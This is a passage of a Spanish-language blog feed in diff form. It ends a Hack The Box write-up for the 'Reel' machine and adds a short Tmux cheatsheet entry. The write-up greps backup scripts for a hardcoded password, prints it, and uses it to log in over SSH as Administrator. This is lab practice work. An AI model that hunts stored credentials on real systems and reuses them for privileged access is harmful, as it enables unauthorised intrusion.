+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cacls&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;root.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Podemos entrar en el directorio pero no podemos ver la flag&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Backup Scripts&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Encontramos varios archivos backup.ps1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Tratamos de grepear en todos los archivos posibles contraseñas hardcodeadas. Para ello primero entramos en una powershell.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select-string&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;PASS: Cr4ckMeIfYouC4n!&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;ssh-2&quot;&gt;ssh&lt;/h2&gt;
+&lt;p&gt;Iniciamos sesión como Administrator en la máquina víctima con las credenciales obtenidas.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;root.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Escrito el 16-12-2021 a las 09:46 am por creep33.&lt;/p&gt;</content><author><name>creep33</name></author><category term="WriteUps" /><category term="HTB" /><summary type="html">WriteUp con metodología de la máquina Reel.</summary></entry><entry><title type="html">Tmux Cheatsheet</title><link href="http://localhost:4000/Tmux/" rel="alternate" type="text/html" title="Tmux Cheatsheet" /><published>2021-12-16T00:00:00+01:00</published><updated>2021-12-16T00:00:00+01:00</updated><id>http://localhost:4000/Tmux</id><content type="html" xml:base="http://localhost:4000/Tmux/">&lt;center&gt;&lt;img src=&quot;/assets/images/Tools/Tmux/TmuxCheatSheet.png&quot; /&gt;&lt;/center&gt;</content><author><name>creep33</name></author><category term="Tools" /><category term="Generic" /><summary type="html">Algunos de los atajos de teclado más utilizados al usar Tmux.</summary></entry></feed>
